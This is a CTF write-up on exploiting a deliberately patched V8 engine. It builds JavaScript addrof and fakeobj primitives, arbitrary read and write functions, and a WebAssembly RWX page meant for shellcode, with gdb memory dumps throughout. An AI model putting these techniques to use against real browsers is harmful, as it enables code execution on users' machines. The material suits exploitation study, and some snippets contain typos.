---
layout: post
title:      "DownunderCTF: V8 Pwn"
date:       2019-21-09
author:     "D4mianwayne"
img:        "/img/banner/downunder.png"
tags:    ["ctf, pwn, v8, browser pwn"]
categories: ["CTFs"]
layout: "simple"

---



In-depth write-up of the V8 challenge from DownUnderCTF 2020.

<!-- more -->

# Foreword

Unfortunately I couldn't solve the challenge, as it was supposed to be easy one still I couldn't but I thought I should do a post with the writeups/exploits from other people and make it very explainative such that I can use for reference later so when I'll get stucked I can take a look and move on with research and who knows maybe it'll be helpful for others too. This write-up mostly revolve around the references listed at the bottom.

### Setup

Although, there's not much to setup as the author was kind enough to give us the `d8` binary which is the build version of the debug version and patch file. Although, having a release version is best, let's build it.

```asm
d4mian@pwnbox:~$ fetch v8
d4mian@pwnbox:~$ cd v8
d4mian@pwnbox:~/v8$ ./build/install-build-deps.sh    
d4mian@pwnbox:~/v8$ git checkout 47054c840e26394dea0e36df47884202a15dd16d # Commit was mentioned in the challenge 
d4mian@pwnbox:~/v8$ gclient sync
d4mian@pwnbox:~/v8$ git apply ../patch.diff # Path to the patch file provided
d4mian@pwnbox:~/v8$ ./tools/dev/v8gen.py x64.release
d4mian@pwnbox:~/v8$ ninja -C ./out.gn/x64.release
d4mian@pwnbox:~/v8$ ./tools/dev/v8gen.py x64.debug
d4mian@pwnbox:~/v8$ ninja -C ./out.gn/x64.debug
```
> Credit: [Faith](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)

# Patch

As we used to reverse engineer the binary in a typical pwn challenge but in case browser pwn, we get a patch file with the commit hash so that we can apply the patch and build the d8, let's analyse the challenges made by the author:-

```js
diff --git a/src/builtins/array-slice.tq b/src/builtins/array-slice.tq
index 7b82f2bda3..4b9478f84e 100644
--- a/src/builtins/array-slice.tq
+++ b/src/builtins/array-slice.tq
@@ -101,7 +101,14 @@ macro HandleFastSlice(
         // to be copied out. Therefore, re-check the length before calling
         // the appropriate fast path. See regress-785804.js
         if (SmiAbove(start + count, a.length)) goto Bailout;
-        return ExtractFastJSArray(context, a, start, count);
+        // return ExtractFastJSArray(context, a, start, count);
+        // Instead of doing it the usual way, I've found out that returning it
+        // the following way gives us a 10x speedup!
+        const array: JSArray = ExtractFastJSArray(context, a, start, count);
+        const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))
+            otherwise Bailout;
+        array.ChangeLength(newLength);
+        return array;
       }
       case (a: JSStrictArgumentsObject): {
         goto HandleSimpleArgumentsSlice(a);
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 26ccb62c68..8114a861cc 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1342,9 +1342,12 @@ MaybeLocal<Context> Shell::CreateRealm(
     }
     delete[] old_realms;
   }
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
+  // Remove globals
+  //Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   Local<Context> context =
-      Context::New(isolate, nullptr, global_template, global_object);
+      //Context::New(isolate, nullptr, global_template, global_object);
+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate),
+                   v8::MaybeLocal<Value>());
   DCHECK(!try_catch.HasCaught());
   if (context.IsEmpty()) return MaybeLocal<Context>();
   InitializeModuleEmbedderData(context);
@@ -2285,10 +2288,13 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
             v8::Isolate::kMessageLog);
   }
 
+  // Prevent `import("stuff")`
+  /*
   isolate->SetHostImportModuleDynamicallyCallback(
       Shell::HostImportModuleDynamically);
   isolate->SetHostInitializeImportMetaObjectCallback(
       Shell::HostInitializeImportMetaObject);
+  */
 
 #ifdef V8_FUZZILLI
   // Let the parent process (Fuzzilli) know we are ready.
@@ -2316,9 +2322,11 @@ Local<Context> Shell::CreateEvaluationContext(Isolate* isolate) {
   // This needs to be a critical section since this is not thread-safe
   base::MutexGuard lock_guard(context_mutex_.Pointer());
   // Initialize the global objects
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
+  //Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   EscapableHandleScope handle_scope(isolate);
-  Local<Context> context = Context::New(isolate, nullptr, global_template);
+  //Local<Context> context = Context::New(isolate, nullptr, global_template);
+  Local<Context> context = Context::New(isolate, nullptr,
+                                        ObjectTemplate::New(isolate));
   DCHECK(!context.IsEmpty());
   if (i::FLAG_perf_prof_annotate_wasm || i::FLAG_vtune_prof_annotate_wasm) {
     isolate->SetWasmLoadSourceMapCallback(ReadFile);
diff --git a/src/objects/js-array.tq b/src/objects/js-array.tq
index a4d4b9d356..7e2738b96e 100644
--- a/src/objects/js-array.tq
+++ b/src/objects/js-array.tq
@@ -26,6 +26,10 @@ macro CreateArrayIterator(implicit context: NativeContext)(
 }
 
 extern class JSArray extends JSObject {
+  macro ChangeLength(newLength: Smi) {
+    this.length = newLength;
+  }
+  
   macro IsEmpty(): bool {
     return this.length == 0;
   }
```

Let's break it down, the first changes made in `array-slice.tq` is our cue here, we need to focus on that:-

```js
diff --git a/src/builtins/array-slice.tq b/src/builtins/array-slice.tq
index 7b82f2bda3..4b9478f84e 100644
--- a/src/builtins/array-slice.tq
+++ b/src/builtins/array-slice.tq
@@ -101,7 +101,14 @@ macro HandleFastSlice(
         // to be copied out. Therefore, re-check the length before calling
         // the appropriate fast path. See regress-785804.js
         if (SmiAbove(start + count, a.length)) goto Bailout;
-        return ExtractFastJSArray(context, a, start, count);
+        // return ExtractFastJSArray(context, a, start, count);
+        // Instead of doing it the usual way, I've found out that returning it
+        // the following way gives us a 10x speedup!
+        const array: JSArray = ExtractFastJSArray(context, a, start, count);
+        const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))
+            otherwise Bailout;
+        array.ChangeLength(newLength);
+        return array;
       }
       case (a: JSStrictArgumentsObject): {
         goto HandleSimpleArgumentsSlice(a);
```

Now, what changed here is the instead of directly returning the array with `ExtractFastJSArray` the patch stores it in variable `array` then define the new length with the line `const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))` which subtracts the count from the start(we will see this in action soon enough), then add `2` to the result and cast it to the `smi` and then the next line `array.ChangeLength(newLength)` which updates the length of the `array` then return the array.
Other changes made to the `v8` here is the security check so that the we cannot use `import (flag_location)` which will result in unresolved import showing the flag, this happened in the iSpamAndHex's CTF v8 challenge, write-up was by p4 team, a very *smart move*.
Now, another interesting change made to the `js-array.tq` which changes the length of the of an array.

The vulnerability lies in how the slice allows us to access the element of a JSArray, if we give `slice(0)` we will be able to access the 2 index from the array which will result in OOB read of `JSArrayMap` and it's element pointer.

So, how do we exploit it? Since this aimed at the very begineers who wanted to pwn that v8 challenge but couldn't(I can relate), I'll go over almost every concept we need to know in order to execute a shellcode. Without further ado, let's dive right in.

# Pointer Compression

Pointer compression has been introduced in the v8 engine which increased the performance of the engine by greater margin. What this means is the upper 32 bytes of the address known as **isolate root** would remain constant for the process while the lower 32 bits of the address can be changed dynamically, as opposed to the OOB challenge of the `*ctf ` which is a good starting point in the browser exploitation, it didn't had the pointer compression. For this challenge, we have to deal with the pointer compression too , it may sound like we have do lots of things to defeat this mechanism, we really don't.

> Writeup for the OOB challenge from *ctf can be found [here](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)

According to [this](https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html), which is written by the author himself:-


---

Well, to start off with, there isn’t really an easy way to leak the isolate root (upper 32 bits of the V8 heap memory space) through JS, but if you think about it, there really isn’t a need to do that in the first place.

If you can massage a vulnerability into addrof and fakeobj primitives, you can fake a JSArray and control the elements pointer to gain arbitrary r/w primitives. The catch here is that these primitives would only let you perform arbitrary reads and writes within the V8 heap. Why you ask? Because the elements pointer of a JSArray stores a 32-bit compressed pointer, and if you change it to an arbitrary 32-bit memory address, performing reads and writes using this elements pointer will cause V8 to add the isolation root.

The way around this is to then go the classic route of allocating an ArrayBuffer on the V8 heap and overwriting its backing store to an arbitrary 64-bit memory address. Then, performing reads and writes with it using either a TypedArray or a DataView object will grant you an arbitrary r/w primitive within the entire 64-bit address space.

The reason this works is because the backing stores of array buffers are allocated using PartitionAlloc (I’m not entirely sure if this is still the case, but this was the case approximately 3-4 years ago, and I haven’t seen anything to suggest that it has changed). All PartitionAlloc allocations go on a separate memory region that is not within the V8 heap. This means that the backing store pointer needs to be stored as an uncompressed 64-bit pointer, since its upper 32 bits are not the same as the isolate root and thus have to be stored with the pointer.

---

From above, we know that we need to understand about the `fakeobj` and `addrof` because that's what we need for now. Since, we know the vulnerability, we have to now move on to the next part of the exploitation, first we will go through the debugging and understand the structure of the `JSArray` and what is `Map` and how exactly we can do with the vulnerability and most importantly how.


# `HandleFastSlice` in action

Enough of the theory part, let's move to some practical part and see how things are at the low level. Since we have the `d8` binary from the challenge, let's first see the array structure:-

> I am using `gdb-gef` for analysing the memory, you can find it [here](https://gef.readthedocs.io/en/master/).

Let's run the binary within the `gdb`:-

```asm
d4mian@pwnbox:~/CTFs$ gdb ./d8 
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
75 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./d8...(no debugging symbols found)...done.
gef➤  run --allow-natives-syntax
Starting program: /home/d4mian/CTFs/d8 --allow-natives-syntax
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7006700 (LWP 3232)]
V8 version 8.7.9
d8> var a = [1.1, 1.2, 1.4];
```
I have used the `allow-naitves-syntax` flag which will allow us to use functions like `%DebugPrint()` which prints the information of the variable and it's associated object and their address which makes `debug` part of the binary.

```asm
d8> %DebugPrint(a);
DebugPrint: 0x199508084a31: [JSArray]
 - map: 0x1995082438fd <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x19950820a555 <JSArray[0]>
 - elements: 0x199508084a11 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x1995080426dd <FixedArray[0]> {
    0x199508044649: [String] in ReadOnlySpace: #length: 0x199508182159 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x199508084a11 <FixedDoubleArray[3]> {
           0: 1.1
           1: 1.2
           2: 1.4
 }
0x1995082438fd: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x1995082438d5 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x199508182445 <Cell value= 1>
 - instance descriptors #1: 0x19950820abd9 <DescriptorArray[1]>
 - transitions #1: 0x19950820ac25 <TransitionArray[4]>Transition array #1:
     0x199508044f5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x199508243925 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x19950820a555 <JSArray[0]>
 - constructor: 0x19950820a429 <JSFunction Array (sfi = 0x19950818b399)>
 - dependent code: 0x1995080421e1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

```

Using `DebugPrint(a)` we got a lot of information about the variable `a`, better to break it down and understand the output one by one. First off, `DebugPrint` tells us that `JSArray` is located at the `0x199508084a31` and the map of the `JSArray` is located at the `0x1995082438fd` and the address `0x199508084a11` is pointing to the elements stored. The Debug Output is enough to understand what is here if you've done binary exploitation.

From the vulnerability, we know that we can access `start + 2` elements of the JSArray, which if you go through the above output would be `JSArrayMap` and other would be `FixedDoubleArray`. Now, we know that we can access the map and the pointer to the elements of the `JSArray`, what do we do now?


It is true that we read by the slice method but we also need a write primitve, if you remember from the patch file, the length of the `JSArray` is being extended during the inital call of the `HandleFastSlice`, which means we can change the content of the `JSArrayMap` and the `FixedDoubleArray` which is a pointer to the array's elements. Now, we know what we can do with the vulnerability, let's move on.

Before we move on, the address will be represented in the floating point value but for debugging we need the 64 bit representation of the floating value and vice versa, we can use JS to make us some utility function to help out with this.

```js
var buf = new ArrayBuffer(8);
var f64_buf = new FloatArray(buf);
var u64_buf = new Unint32Array(buf);

function ftoi(val, size) {

   f64_buf[0] = val;

   if(size == 32) {
      return BigInt(u64_buf[0]);
   } else if(size == 64) {
      return BigInt(u64_buf[0]) + BigUint(u64_buf[1]  << 32n);
      
   }
}

function itof(val, size) {
   if(size == 32) {
      u64_buf[0] = Number(val & 0xffffffffn);
   } else if(size == 64) {
      u64_buf[0] = Number(val & 0xffffffffn)
      u64_buf[1] = Number(val << 32n);
   }
   return f64_buf[0];
}
```


The above utilites function would change the integer to the float and the float to integer named `itof` and `ftoi` respectively. Now, we have the utilties function lets create a JS script in which we can access the `array[length + 1]` which will give us the `JSArray`'s map and the `array[length + 2]` which will give us the pointer of the elements stored in the `JSArray`.

```js
var aux_float_arr = [1.1, 2.2, 3.3];
var aux_arr = aux_float_arr.slice(aux_float_arr) 

/*
When we do `aux_float_arr.slice(aux_float_arr)` the slice function will try to show the whole array + 2 more than the actual length of it which
will turn into the OOB read. hence leaking the addresses.
*/

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {

    f64_buf[0] = val;

    if(size == 32) {
        return BigInt(u64_buf[0]);
    } else if(size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

}

function itof(val, size) {

    if(size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if(size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }

    return f64_buf[0];

}

// We only get the lower 32 bytes, since that's what we need because of the pointer compression

var flt_arr_map = ftoi(aux_arr[3], 32); // Lower 32 bits of the Map address
var elem_arr_ptr = ftoi(aux_arr[4], 32); //  Lower 32 bits of the elements pointer


console.log("[+] Float array map: 0x" + flt_arr_map.toString(16));
console.log("[+] Pointer to array elements: 0x" + elem_arr_ptr.toString(16));
```

Let's run this script in the release version, as there's no need of the release version I build it for my convenience but use the provided `d8` binary if you don't want to go through the hassle of building it from scratch.

```asm
gef➤  r --shell ./xpl.js 
Starting program: /home/d4mian/CTFs/d8 --shell ./xpl.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7006700 (LWP 12770)]
[+] Float array map: 0x82438fd
[+] Pointer to array elements: 0x8084e91
V8 version 8.7.9
d8> 
```

Successfully, we leaked the pointers of the `JSArrayMap` and the element pointer. Now, since we can read the address, it's time to see if it possible to leverage this vulnerability to the `addrof` and `fakeobj`, but first let's understand what these are.

# `JSArrayMap`

Before we first dive into those, we must understand what exactly the `map` is and what could be even done with this? 

Map of an object in JS in context of V8 tells the engine on how the elements are accessed, the reason we have map in the engine because V8 have to be fast enough to access elements, objects and other associated information of the object such that the lookup time would be very less.

According to phrack paper [here](), the map is defined as:-

---

The Map is a key data structure in v8, containing information such as

* The dynamic type of the object, i.e. String, Uint8Array, HeapNumber, ...
* The size of the object in bytes
* The properties of the object and where they are stored
* The type of the array elements, e.g. unboxed doubles or tagged pointers
* The prototype of the object if any

While the property names are usually stored in the Map, the property values are stored with the object itself in one of several possible regions. The Map then provides the exact location of the property value in the respective region.

---

It is also mentioned that Maps are very expensive in terms of memory, since V8 have to be faster enough to work through all the objects the Maps are shared and distributed among the objects. So, since we can access the `JSArray` object map. If we overwrite a `JSArray`'s map we can cause type confusion in the JIT compiler which will lead to unexpected behaviour within the compiler. Now, we have an overall understanding of the what map is, let's try to overwrite the map of the array with any value for a sanity check.

Just add the following line to the `xpl.js`:-

```js
aux_arr[3] = itof(1337n, 32);
```

If you're wondering why `3` specifically, if you see the above code snippet, we have 3 elements in `aux_arr` from index `0-2`, then we call `slice` on the array with the count being the array, because of the patch we know calling the `slice` will add 2 more to the length than it originally have, hence allowing us to access map of the array and the element pointer.

Let's run the `d8` with the `xpl.js` of ours and see if it worked or not:-

```asm
gef➤  r --shell --allow-natives-syntax ~/CTFs/xpl.js 
Starting program: /home/d4mian/Pwning/v8/out.gn/x64.release/d8 --shell --allow-natives-syntax ~/CTFs/xpl.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff65fe700 (LWP 2403)]
[+] Float array map: 0x82438fd
[+] Pointer to array elements: 0x8084ec1
V8 version 8.7.9
d8> 
```

It successfully ran, that means it worked. Now, to see if it really worked ot not, we have to analyse the memory, from the leak we know the lower 32 bits of the elements pointer address and with the help of `gef`'s `vmmap`, we can get isolate root address, with that we can check that the write worked or not.

```asm
gef➤  r --shell --allow-natives-syntax ~/CTFs/xpl.js 
Starting program: /home/d4mian/Pwning/v8/out.gn/x64.release/d8 --shell --allow-natives-syntax ~/CTFs/xpl.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff65fe700 (LWP 2403)]
[+] Float array map: 0x82438fd
[+] Pointer to array elements: 0x8084ec1
V8 version 8.7.9
d8> ^C
Thread 1 "d8" received signal SIGINT, Interrupt.

-- snip --

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000365100000000 0x000036510000c000 0x0000000000000000 rw- 
0x000036510000c000 0x0000365100040000 0x0000000000000000 --- 
0x0000365100040000 0x0000365100043000 0x0000000000000000 rw- 
0x0000365100043000 0x0000365100044000 0x0000000000000000 --- 
0x0000365100044000 0x0000365100054000 0x0000000000000000 r-x 
0x0000365100054000 0x000036510007f000 0x0000000000000000 --- 
0x000036510007f000 0x0000365108040000 0x0000000000000000 --- 
0x0000365108040000 0x000036510805f000 0x0000000000000000 r-- 


-- snip --
```

The isolate root here is the `0x0000365100000000`, we can add the lower 32 bits of the elements pointer i.e. `0x8084ec1` to get the absolute address of the elements pointer, let's see if we successfully overwritten the map or not.

```asm
gef➤  x/40xg 0x0000365100000000 + 0x8084ec1  - 1
0x365108084ec0:	0x0000000608042a31	0x3ff199999999999a
0x365108084ed0:	0x400199999999999a	0x400a666666666666
0x365108084ee0:	0x0000000a00000539	0x0000000a08084ec1
```
If you can pay attention to the `0x365108084ee0` address, we have lower 32 bits address written with `0x539` which is the hex value of `1337`. We overwritten the map successfully. Now, it's time to leverage this to get `fakeobj` and `addrof` primitive.

# `fakeobj` and `addrof` primtive

First off, we will go over the `addrof` primitive, this primitive allow us to read the address of a arbitrary JS Object and on the other hand the `fakeobj` allow us to inject a fake JS Object into the V8 engine.
Now, we need to replicate these two primitives, let's do it:-

```js
var aux_obj = {"a": 1}
var aux_obj_arr = [aux_obj];
var aux_float_arr = [1.1, 2.2, 3.3];
var aux_arr = aux_float_arr.slice(aux_float_arr)

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {

    f64_buf[0] = val;

    if(size == 32) {
        return BigInt(u64_buf[0]);
    } else if(size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

}

function itof(val, size) {

    if(size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if(size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }

    return f64_buf[0];

}

var flt_arr_map = ftoi(aux_arr[3], 32);
var elem_arr_ptr = ftoi(aux_arr[4], 32);
console.log("[+] Float array map: 0x" + flt_arr_map.toString(16));
console.log("[+] Pointer to array elements: 0x" + elem_arr_ptr.toString(16));

var elem_obj_arr = elem_arr_ptr - 0xc4n
aux_arr[4] = itof((ftoi(aux_arr[4], 64) & 0xffffffff00000000n) + elem_obj_arr, 64);

```
What we did here is, retrieve the address of the `aux_arr_obj` which is the located at the address `elem_arr_ptr - 0xc4n` then we change the pointer of the elements to that of the object.

```asm
gef➤  r --shell --allow-natives-syntax ~/CTFs/xpl.js 
Starting program: /home/d4mian/CTFs/d8 --shell --allow-natives-syntax ~/CTFs/xpl.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7006700 (LWP 4593)]
[+] Float array map: 0x82438fd
[+] Pointer to array elements: 0x8084f69
[+] Element Object Array: 0x8084ea5
V8 version 8.7.9
d8> %DebugPrint(aux_obj_arr);
DebugPrint: 0x194f08084eb5: [JSArray]
 - map: 0x194f0824394d <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x194f0820a555 <JSArray[0]>
 - elements: 0x194f08084ea9 <FixedArray[1]> [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x194f080426dd <FixedArray[0]> {
    0x194f08044649: [String] in ReadOnlySpace: #length: 0x194f08182159 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x194f08084ea9 <FixedArray[1]> {
           0: 0x194f08084e7d <Object map = 0x194f0824579d>
 }
0x194f0824394d: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x194f08243925 <Map(HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x194f08182445 <Cell value= 1>
 - instance descriptors #1: 0x194f0820abd9 <DescriptorArray[1]>
 - transitions #1: 0x194f0820ac55 <TransitionArray[4]>Transition array #1:
     0x194f08044f5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x194f08243975 <Map(HOLEY_ELEMENTS)>

 - prototype: 0x194f0820a555 <JSArray[0]>
 - constructor: 0x194f0820a429 <JSFunction Array (sfi = 0x194f0818b399)>
 - dependent code: 0x194f080421e1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[{a: 1}]
d8> "0x"+ftoi(aux_arr[0], 64).toString(16);
"0x8084e7d00000002"
d8> 
```
> Remember, when analysing the address, be sure to subtract 1 from it since pointers are tagged.

Success, we changed the element pointer of the `JSArray` i.e. `aux_arr` then after that we check the first element of the `aux_arr` since we put the fake map object i.e. the address of the  `obj_arr` then when we tend to see the content of the element it'll result in the leak of the `obj_arr`'s map. In the context of JIT exploitation, this is what we call `addrof` since we can get the address of an arbitrary object from the engine. 

Now, we have to write `addrof` as a function to help later in the exploit:-

```js
function addrof(obj) {
    aux_arr = aux_float_arr.slice(aux_float_arr) // slice the array to access the map and the element pointer 
    aux_arr[4] = itof((ftoi(aux_arr[4], 64) & 0xffffffff00000000n) + elem_obj_arr, 64); // Change the element pointer to the address of `obj_arr`'s element's
    aux_obj_arr[0] = obj; // Place the object at 0th index
    return ftoi(aux_arr[0], 32) // Get the address of the object
}
```

The `fakeobj` function:-

```js
function fakeobj(addr) {
    let fake;    // Declare the fake variable
    aux_arr = aux_float_arr.slice(aux_float_arr); // slice the array to access the map and the element pointer
    aux_arr[0] = itof(addr, 32);                  // Make the 0th index the address
    aux_arr[3] = itof((ftoi(aux_arr[3], 64) & 0xffffffff00000000n) + obj_arr_map, 64); // Change the map of the array to object's map
    fake = aux_arr[0]; 
    return fake;
}
```

We will see how both of these functions can be used in the arbitrary read and write, don't worry if you don't understand because the next section is very detailed.

# Arbitrary r/w 

From start to end, we had this one goal to get an arbitrary read/write primitive, now it's time to see it in action. First off, we will start off with the arbitray read and see how we can read any arbitrary address with the use of `fakeobj` and `addrof`.

To perform arbitrary read, what we will do is create a float array and make the element of the 0th index of the float array to the value of the float array's map using `slice`. Then we set the value of the map to of a fake object then the 3rd index of the float array will be treated as the elemnt pointer of the fake object.

Let's see it in the `d8` shell itself:-

```asm
d8> var a = [1.1, 1.2, 1.3];
undefined
d8> %DebugPrint(a);
DebugPrint: 0x369d08086c99: [JSArray]
 - map: 0x369d082438fd <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 
 -- snip -- 

gef➤  x/10xg 0x369d08086c99 - 0x30 - 1
0x369d08086c68:	0x0000000008086c39	0x08042211fffffffe 
0x369d08086c78:	0x0000000608042a31	0x3ff199999999999a
0x369d08086c88:	0x3ff3333333333333	0x3ff4cccccccccccd
0x369d08086c98:	0x080426dd082438fd	0x0000000608086c79 <---- JSArray
0x369d08086ca8:	0xd15095f608042545	0x626544250000000f

element: `0x369d08086c68`
0th element: `0x369d08086c80`

The address `0x369d08086c80` points to the first element of the JSArray, if we change this to the map of the fake object
Then the address `0x369d08086c98` would be treated as fake object element pointer, so when we try to read the fake_object[0] it will show the address of whatever value is stored at the address `0x369d08086c98 + 0x10`.
```

Let's do this by calling our previous functions `fakeobj` and `addrof`:-

```js
var rw_helper = [itof(flt_arr_map, 64), 1.1, 2.2, 3.3];
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;

console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

let fake = fakeobj(rw_helper_addr - 0x20n);
rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
```

What we doing here is, using the `rw_helper` to be used as the float array then we create a fake objected at the `rw_helper_addr - 0x20n` then we make the 1st index of the `rw_helper`'s 1st index to the address of the `addr`, then once we try to access the 0th index value from the `rw_helper` it'll give us the value stored at the `addr`.

Running this:-

```asm
gef➤  r --shell --allow-natives-syntax ~/CTFs/xpl.js 
Starting program: /home/d4mian/CTFs/d8 --shell --allow-natives-syntax ~/CTFs/xpl.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7006700 (LWP 3206)]
[+] Float array map: 0x82438fd
[+] Pointer to array elements: 0x8085321
[+] Pointer to object array elements: 0x8085265
[+] Object array map: 0x824394d
[+] Controlled RW helper address: 0x8085711
V8 version 8.7.9
d8> "0x"+ftoi(rw_helper[0], 32).toString(16);
"0x82438fd"

-- snip --

gef➤  x/xg 0x8085711 + 0x00003e3a00000000 - 1
0x3e3a08085710:	0x080426dd082438fd
```

Awesome, we successfully got the value of the `rw_helper`'s array address. Now, we need to leverage this to the arbitrary write, before moving on let's make a function `arb_read`:-

```js
function arb_read(addr) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    return ftoi(fake[0], 64);
}
```


Just like the arbitrary read, we will use the `fakeobj` and `addrof` to write to a memory location. What we will do here is we inject a fake object i.e. `rw_helper` array's address then we make the 1st index of the `rw_helper` pointing to the address we want to write to. then we do `fake[0] = val`, we will write the value to the address pointed by the `fake`'s 0th index.

For now, let's create a function named `arb_write` which is based on the logic above:-

```js
function arb_write(addr, value) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    fake[0] = itof(value, 64);
}
```

# Shellcode and Profit

Although, because of the pointer compression we can't just directly write to any hook functions and just let it be called, because of the pointer compression we can only write to the heap addresspace but as suggest on the article that I linked earlier, it is mentioned that we can create a WebAssembly Page which is by default marked as `RWX` which is perfect candidate for the shellcode. If we create a wasm function whose address can be leaked somehow then we can write shellcode to it with the `arb_write` and then execute the function, we will create one with some garbage data which doesn't even matter as long as it creates a `RWX` page. Now, what we will do from here is to first create a `RWX` page then find it via `gef`, the best way as I have learned from the other writeups is use `debug` version of `d8` and then find it with some trial and error:-

Let's create a wasm function first and see the base address of the `RWX` page via `vmmap`, add the following lines of code to the `xpl.js`:-
```js

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,
                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,
                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,
                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;
```

Now, let's run it with the debug version of `d8` that we **build**:-

```asm
gef➤  r --shell --allow-natives-syntax ~/CTFs/xpl.js 
Starting program: /home/d4mian/Pwning/v8/out.gn/x64.debug/d8 --shell --allow-natives-syntax ~/CTFs/wasm.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/l9221120237041090560nibthread_db.so.1".
[New Thread 0x7ffff2063700 (LWP 4436)]
V8 version 8.7.0 (candidate)
d8> ^C
Thread 1 "d8" received signal SIGINT, Interrupt.

-- snip -- 
gef➤ vmmap

-- snip --

0x0000379395694000 0x0000379395695000 0x0000000000000000 rwx 
0x0000555555554000 0x00005555555e4000 0x0000000000000000 r-- /home/d4mian/Pwning/v8/out.gn/x64.debug/d8
0x00005555555e4000 0x000055555565e000 0x000000000008f000 r-x /home/d4mian/Pwning/v8/out.gn/x64.debug/d8
0x000055555565e000 0x0000555555661000 0x0000000000108000 r-- /home/d4mian/Pwning/v8/out.gn/x64.debug/d8
0x0000555555661000 0x0000555555662000 0x000000000010a000 rw- /home/d4mian/Pwning/v8/out.gn/x64.debug/d8
